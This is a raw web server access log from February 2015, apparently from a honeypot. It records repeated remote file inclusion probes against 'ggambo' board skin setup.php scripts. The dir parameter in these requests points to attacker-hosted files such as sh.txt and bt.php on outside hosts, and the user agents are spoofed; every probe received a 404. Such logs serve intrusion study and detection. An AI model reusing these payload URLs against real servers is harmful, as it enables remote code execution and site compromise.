176.31.252.38 - - [19/Feb/2015:15:43:44 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" 
176.31.252.38 - - [19/Feb/2015:15:43:45 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1" 
176.31.252.38 - - [19/Feb/2015:15:43:46 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1" 
176.31.252.38 - - [19/Feb/2015:15:43:46 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1" 
176.31.252.38 - - [19/Feb/2015:15:43:47 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1" 
176.31.252.38 - - [19/Feb/2015:15:43:49 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "msnbot/1.1 (+http://search.msn.com/msnbot.htm)" 
176.31.252.38 - - [19/Feb/2015:15:43:50 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "msnbot/1.1 (+http://search.msn.com/msnbot.htm)" 
176.31.252.38 - - [19/Feb/2015:15:43:51 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "msnbot/1.1 (+http://search.msn.com/msnbot.htm)" 
176.31.252.38 - - [19/Feb/2015:15:43:52 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "msnbot/1.1 (+http://search.msn.com/msnbot.htm)" 
176.31.252.38 - - [19/Feb/2015:15:44:47 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "FreeWebMonitoring SiteChecker/0.1 (+http://www.freewebmonitoring.com)" 
176.31.252.38 - - [19/Feb/2015:15:44:48 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "FreeWebMonitoring SiteChecker/0.1 (+http://www.freewebmonitoring.com)" 
176.31.252.38 - - [19/Feb/2015:15:44:48 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "FreeWebMonitoring SiteChecker/0.1 (+http://www.freewebmonitoring.com)" 
176.31.252.38 - - [19/Feb/2015:15:44:50 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "FreeWebMonitoring SiteChecker/0.1 (+http://www.freewebmonitoring.com)" 
104.130.161.113 - - [19/Feb/2015:15:55:28 -0800] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 301 484 "-" "Tornado-Async-Client" 
104.130.161.113 - - [19/Feb/2015:15:55:28 -0800] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 200 930780 "-" "Tornado-Async-Client" 
104.130.161.114 - - [19/Feb/2015:15:55:32 -0800] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 301 484 "-" "Tornado-Async-Client" 
104.130.161.114 - - [19/Feb/2015:15:55:32 -0800] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 200 930780 "-" "Tornado-Async-Client" 
71.6.150.241 - - [19/Feb/2015:16:15:07 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.8 [en] (Windows NT 5.0; U)" 
71.6.150.241 - - [19/Feb/2015:16:15:09 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.8 [en] (Windows NT 5.0; U)" 
71.6.150.241 - - [19/Feb/2015:16:15:09 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.8 [en] (Windows NT 5.0; U)" 
71.6.150.241 - - [19/Feb/2015:16:15:10 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.8 [en] (Windows NT 5.0; U)" 
1.224.163.80 - - [19/Feb/2015:16:15:17 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl; rv:1.8) Gecko/20051107 Firefox/1.5" 
1.224.163.80 - - [19/Feb/2015:16:15:18 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl; rv:1.8) Gecko/20051107 Firefox/1.5" 
1.224.163.80 - - [19/Feb/2015:16:15:19 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl; rv:1.8) Gecko/20051107 Firefox/1.5" 
1.224.163.80 - - [19/Feb/2015:16:15:19 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl; rv:1.8) Gecko/20051107 Firefox/1.5" 
1.224.163.80 - - [19/Feb/2015:16:15:20 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl; rv:1.8) Gecko/20051107 Firefox/1.5" 
1.224.163.80 - - [19/Feb/2015:16:15:20 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl; rv:1.8) Gecko/20051107 Firefox/1.5" 
1.224.163.80 - - [19/Feb/2015:16:15:21 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl; rv:1.8) Gecko/20051107 Firefox/1.5" 
1.224.163.80 - - [19/Feb/2015:16:15:21 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl; rv:1.8) Gecko/20051107 Firefox/1.5" 
1.224.163.80 - - [19/Feb/2015:16:15:32 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Advanced Browser (http://www.avantbrowser.com)" 
112.218.68.155 - - [19/Feb/2015:16:15:33 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
1.224.163.80 - - [19/Feb/2015:16:15:33 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Advanced Browser (http://www.avantbrowser.com)" 
1.224.163.80 - - [19/Feb/2015:16:15:34 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "Advanced Browser (http://www.avantbrowser.com)" 
112.218.68.155 - - [19/Feb/2015:16:15:34 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
112.218.68.155 - - [19/Feb/2015:16:15:35 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
1.224.163.80 - - [19/Feb/2015:16:15:35 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "Advanced Browser (http://www.avantbrowser.com)" 
112.218.68.155 - - [19/Feb/2015:16:15:37 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
112.218.68.155 - - [19/Feb/2015:16:15:42 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020515)" 
112.218.68.155 - - [19/Feb/2015:16:15:43 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
112.218.68.155 - - [19/Feb/2015:16:15:43 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020515)" 
112.218.68.155 - - [19/Feb/2015:16:15:44 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020515)" 
112.218.68.155 - - [19/Feb/2015:16:15:44 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
1.224.163.80 - - [19/Feb/2015:16:15:45 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Advanced Browser (http://www.avantbrowser.com)" 
112.218.68.155 - - [19/Feb/2015:16:15:45 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
112.218.68.155 - - [19/Feb/2015:16:15:45 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020515)" 
1.224.163.80 - - [19/Feb/2015:16:15:46 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Advanced Browser (http://www.avantbrowser.com)" 
112.218.68.155 - - [19/Feb/2015:16:15:47 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020515)" 
112.218.68.155 - - [19/Feb/2015:16:15:48 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
1.224.163.80 - - [19/Feb/2015:16:15:49 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "Advanced Browser (http://www.avantbrowser.com)" 
112.218.68.155 - - [19/Feb/2015:16:15:49 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020515)" 
112.218.68.155 - - [19/Feb/2015:16:15:50 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020515)" 
1.224.163.80 - - [19/Feb/2015:16:15:50 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "Advanced Browser (http://www.avantbrowser.com)" 
112.218.68.155 - - [19/Feb/2015:16:15:51 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020515)" 
178.33.226.103 - - [19/Feb/2015:16:15:52 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Microsoft Pocket Internet Explorer/0.6" 
178.33.226.103 - - [19/Feb/2015:16:15:53 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Microsoft Pocket Internet Explorer/0.6" 
178.33.226.103 - - [19/Feb/2015:16:15:53 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "Microsoft Pocket Internet Explorer/0.6" 
178.33.226.103 - - [19/Feb/2015:16:15:54 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "Microsoft Pocket Internet Explorer/0.6" 
176.31.252.38 - - [19/Feb/2015:16:17:05 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows;U;Windows NT 5.1; l-PL;rv:1.8.1.24pre) Gecko/20100228 K-Meleon/1.5.4" 
176.31.252.38 - - [19/Feb/2015:16:17:06 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows;U;Windows NT 5.1; l-PL;rv:1.8.1.24pre) Gecko/20100228 K-Meleon/1.5.4" 
176.31.252.38 - - [19/Feb/2015:16:17:06 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows;U;Windows NT 5.1; l-PL;rv:1.8.1.24pre) Gecko/20100228 K-Meleon/1.5.4" 
176.31.252.38 - - [19/Feb/2015:16:17:07 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows;U;Windows NT 5.1; l-PL;rv:1.8.1.24pre) Gecko/20100228 K-Meleon/1.5.4" 
1.224.163.80 - - [19/Feb/2015:16:17:20 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.8 [en] (Windows NT 5.0; U)" 
1.224.163.80 - - [19/Feb/2015:16:17:22 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.8 [en] (Windows NT 5.0; U)" 
1.224.163.80 - - [19/Feb/2015:16:17:22 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.8 [en] (Windows NT 5.0; U)" 
1.224.163.80 - - [19/Feb/2015:16:17:24 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.8 [en] (Windows NT 5.0; U)" 
114.202.2.31 - - [19/Feb/2015:16:19:01 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
114.202.2.31 - - [19/Feb/2015:16:19:02 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
114.202.2.31 - - [19/Feb/2015:16:19:03 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
114.202.2.31 - - [19/Feb/2015:16:19:04 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
176.31.252.38 - - [19/Feb/2015:16:19:53 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows;U;Windows NT 5.1; l-PL;rv:1.8.1.24pre) Gecko/20100228 K-Meleon/1.5.4" 
176.31.252.38 - - [19/Feb/2015:16:19:54 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows;U;Windows NT 5.1; l-PL;rv:1.8.1.24pre) Gecko/20100228 K-Meleon/1.5.4" 
176.31.252.38 - - [19/Feb/2015:16:19:54 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows;U;Windows NT 5.1; l-PL;rv:1.8.1.24pre) Gecko/20100228 K-Meleon/1.5.4" 
176.31.252.38 - - [19/Feb/2015:16:19:55 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows;U;Windows NT 5.1; l-PL;rv:1.8.1.24pre) Gecko/20100228 K-Meleon/1.5.4" 
203.58.0.155 - - [19/Feb/2015:16:19:55 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/2.0 (compatible; MSIE 3.01; Windows 98)" 
203.58.0.155 - - [19/Feb/2015:16:19:57 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/2.0 (compatible; MSIE 3.01; Windows 98)" 
203.58.0.155 - - [19/Feb/2015:16:19:58 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/2.0 (compatible; MSIE 3.01; Windows 98)" 
203.58.0.155 - - [19/Feb/2015:16:19:59 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/2.0 (compatible; MSIE 3.01; Windows 98)" 
178.33.226.103 - - [19/Feb/2015:16:20:01 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Microsoft Pocket Internet Explorer/0.6" 
178.33.226.103 - - [19/Feb/2015:16:20:03 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Microsoft Pocket Internet Explorer/0.6" 
178.33.226.103 - - [19/Feb/2015:16:20:03 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "Microsoft Pocket Internet Explorer/0.6" 
178.33.226.103 - - [19/Feb/2015:16:20:04 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "Microsoft Pocket Internet Explorer/0.6" 
203.58.0.155 - - [19/Feb/2015:16:20:09 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/2.0 (compatible; MSIE 3.01; Windows 98)" 
203.58.0.155 - - [19/Feb/2015:16:20:11 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/2.0 (compatible; MSIE 3.01; Windows 98)" 
203.58.0.155 - - [19/Feb/2015:16:20:12 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/2.0 (compatible; MSIE 3.01; Windows 98)" 
203.58.0.155 - - [19/Feb/2015:16:20:13 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/2.0 (compatible; MSIE 3.01; Windows 98)" 
112.218.68.155 - - [19/Feb/2015:16:22:01 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/3.0 (X11; I; SunOS 5.4 sun4m)" 
112.218.68.155 - - [19/Feb/2015:16:22:02 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/3.0 (X11; I; SunOS 5.4 sun4m)" 
112.218.68.155 - - [19/Feb/2015:16:22:03 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/3.0 (X11; I; SunOS 5.4 sun4m)" 
112.218.68.155 - - [19/Feb/2015:16:22:03 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/3.0 (X11; I; SunOS 5.4 sun4m)" 
112.218.68.155 - - [19/Feb/2015:16:22:03 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/3.0 (X11; I; SunOS 5.4 sun4m)" 
112.218.68.155 - - [19/Feb/2015:16:22:04 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/3.0 (X11; I; SunOS 5.4 sun4m)" 
112.218.68.155 - - [19/Feb/2015:16:22:05 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/3.0 (X11; I; SunOS 5.4 sun4m)" 
112.218.68.155 - - [19/Feb/2015:16:22:05 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/3.0 (X11; I; SunOS 5.4 sun4m)" 
1.224.163.80 - - [19/Feb/2015:16:22:06 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl; rv:1.8) Gecko/20051107 Firefox/1.5" 
1.224.163.80 - - [19/Feb/2015:16:22:06 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl; rv:1.8) Gecko/20051107 Firefox/1.5" 
176.31.252.38 - - [19/Feb/2015:16:22:07 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "msnbot/1.1 (+http://search.msn.com/msnbot.htm)" 
1.224.163.80 - - [19/Feb/2015:16:22:07 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl; rv:1.8) Gecko/20051107 Firefox/1.5" 
1.224.163.80 - - [19/Feb/2015:16:22:07 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl; rv:1.8) Gecko/20051107 Firefox/1.5" 
1.224.163.80 - - [19/Feb/2015:16:22:07 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl; rv:1.8) Gecko/20051107 Firefox/1.5" 
1.224.163.80 - - [19/Feb/2015:16:22:08 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl; rv:1.8) Gecko/20051107 Firefox/1.5" 
176.31.252.38 - - [19/Feb/2015:16:22:08 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "msnbot/1.1 (+http://search.msn.com/msnbot.htm)" 
176.31.252.38 - - [19/Feb/2015:16:22:08 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "msnbot/1.1 (+http://search.msn.com/msnbot.htm)" 
1.224.163.80 - - [19/Feb/2015:16:22:09 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl; rv:1.8) Gecko/20051107 Firefox/1.5" 
1.224.163.80 - - [19/Feb/2015:16:22:09 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl; rv:1.8) Gecko/20051107 Firefox/1.5" 
176.31.252.38 - - [19/Feb/2015:16:22:09 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "msnbot/1.1 (+http://search.msn.com/msnbot.htm)" 
176.31.252.38 - - [19/Feb/2015:16:22:31 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)" 
176.31.252.38 - - [19/Feb/2015:16:22:32 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://183.63.23.90/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)" 
176.31.252.38 - - [19/Feb/2015:16:22:32 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)" 
176.31.252.38 - - [19/Feb/2015:16:22:33 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)" 
176.31.252.38 - - [19/Feb/2015:16:22:34 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)" 
176.31.252.38 - - [19/Feb/2015:16:22:35 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://183.63.23.90/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)" 
176.31.252.38 - - [19/Feb/2015:16:22:35 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)" 
176.31.252.38 - - [19/Feb/2015:16:22:36 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)" 
1.224.163.80 - - [19/Feb/2015:16:22:59 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; .NET CLR 1.1.4322)" 
1.224.163.80 - - [19/Feb/2015:16:23:01 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; .NET CLR 1.1.4322)" 
1.224.163.80 - - [19/Feb/2015:16:23:01 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; .NET CLR 1.1.4322)" 
1.224.163.80 - - [19/Feb/2015:16:23:03 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; .NET CLR 1.1.4322)" 
